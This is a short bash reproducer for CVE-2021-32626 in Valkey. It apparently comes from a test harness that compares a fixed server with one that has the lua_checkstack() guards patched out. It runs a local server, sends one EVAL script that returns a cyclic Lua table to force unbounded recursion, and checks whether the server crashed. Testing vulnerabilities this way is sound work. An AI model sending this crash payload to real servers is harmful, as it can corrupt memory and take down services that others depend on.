#!/bin/bash
# Reproducer for CVE-2021-32626: missing lua_checkstack() calls around
# conversions between Lua values and server replies. A Lua script that
# returns a self-referential (cyclic) table forces luaReplyToServerReply()
# to recurse without bound. The fixed server detects that the Lua stack
# cannot grow further and returns a clean error ("reached lua stack
# limit"), leaving the connection usable. The buggy server (injected
# patch removes the lua_checkstack() guards) keeps recursing and pushing
# onto an under-sized Lua stack, corrupting memory and crashing.
set -u
set +m

"$VALKEY_SERVER" --port "$PORT" --save "" --appendonly no --dir . \
    --enable-debug-command yes --logfile s.log &
SERVER_PID=$!
disown "$SERVER_PID" 2>/dev/null

for _ in $(seq 1 100); do
    "$VALKEY_CLI" -p "$PORT" ping >/dev/null 2>&1 && break
    sleep 0.1
done

echo "EVAL:"
"$VALKEY_CLI" -p "$PORT" eval 'local a = {}; local b = {a}; a[1] = b; return a' 0 2>&1

echo "PING after EVAL:"
"$VALKEY_CLI" -p "$PORT" ping 2>&1

if ! kill -0 "$SERVER_PID" 2>/dev/null; then
    echo "SERVER CRASHED"
fi

"$VALKEY_CLI" -p "$PORT" shutdown nosave >/dev/null 2>&1
wait "$SERVER_PID" 2>/dev/null
true
